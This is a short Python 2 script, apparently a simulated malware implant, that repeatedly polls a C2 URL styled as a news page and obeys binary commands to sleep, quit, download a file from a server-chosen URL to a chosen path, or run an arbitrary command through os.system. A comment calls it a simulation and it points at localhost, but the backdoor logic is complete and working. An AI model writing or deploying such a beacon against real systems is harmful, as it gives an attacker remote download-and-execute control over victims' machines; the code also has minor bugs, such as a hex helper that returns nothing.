import sys
import struct
import urllib
import urllib2
import time
import os

def as_hex(s):
    ''.join([c.encode('hex') for c in s])

def main():
    url = 'http://localhost:8000/news.php?ver=%d&ser=%d' % (0, 0)
    done = False
    sleep_time = 3
    exec_cmd = 0x45584543
    kill_cmd = 0x4b494c4c
    rest_cmd = 0x52455354
    dwld_cmd = 0x44574c44

    while not done:
        conn = urllib2.urlopen(url)
        content = conn.read(4096)
        conn.close()

        if len(content) >= 4:
            cmd = struct.unpack('<I', content[:4])[0]

            if cmd == kill_cmd:
                print 'Received KILL command.'
                print 'Quitting program'
                done = True
            elif cmd == rest_cmd:
                print 'Received REST command.'
                if len(content) >= 8:
                    sleep_time = struct.unpack('<I', content[4:8])[0] / 1000
                    if sleep_time < 0 or sleep_time >=  0x1000000:
                        sleep_time = 60
                    print 'New sleep time: %s seconds' % (sleep_time)
                else:
                    print 'Did not receive enough data for REST command'
            elif cmd == dwld_cmd:
                print 'Received DWLD command.'
                if len(content) >= 8:
                    url_len = struct.unpack('<I', content[4:8])[0]
                    print 'DWLD url length: 0x%x' % (url_len)
                    dwld_url = struct.unpack('%ds' % (url_len), content[8:8 + url_len])[0]
                    print 'DWLD url: %s' % (dwld_url)
                    path_idx = 8 + url_len
                    if len(content) >= path_idx + 4:
                        path_len = struct.unpack('<I', content[path_idx:path_idx + 4])[0]
                        print 'DWLD path length: 0x%x' % (path_len)
                        dwld_path = struct.unpack('%ds' % (path_len), content[path_idx +4:path_idx + 4 + path_len])[0]  
                        print 'DWLD path: %s' % (dwld_path)
                        dwld_path = os.path.expandvars(dwld_path)
                        print 'DWLD %s to %s' % (dwld_url, dwld_path)
                        urllib.urlretrieve(dwld_url, dwld_path)
                    else:
                        print 'Received malformed DWLD command'
                else:
                    print 'Received malformed DWLD command'
            elif cmd == exec_cmd:
                print 'Recieved EXEC command.'
                if len(content) >= 8:
                    path_len = struct.unpack('<I', content[4:8])[0]
                    print 'EXEC path length: 0x%x' % (path_len)
                    exec_path = struct.unpack('%ds' % (path_len), content[8:8 + path_len])[0]
                    print 'EXEC path: %s' % (exec_path)
                    exec_path = os.path.expandvars(exec_path)
                    print 'EXEC %s' % (exec_path)
                    os.system(exec_path)
                    done = True # For quitting after one exec commands for simulation purposes
                else:
                    print 'Received malformed EXEC command'
            else:
                print 'Unrecognized command'
                print 'Received: %s' % (as_hex(content[:4]))
        else:
            'Did not receive enough data to be a valid command.'

        if not done:
            print 'Entering sleep for %s seconds' % (sleep_time)
            time.sleep(sleep_time)

if __name__ == '__main__':
    main()
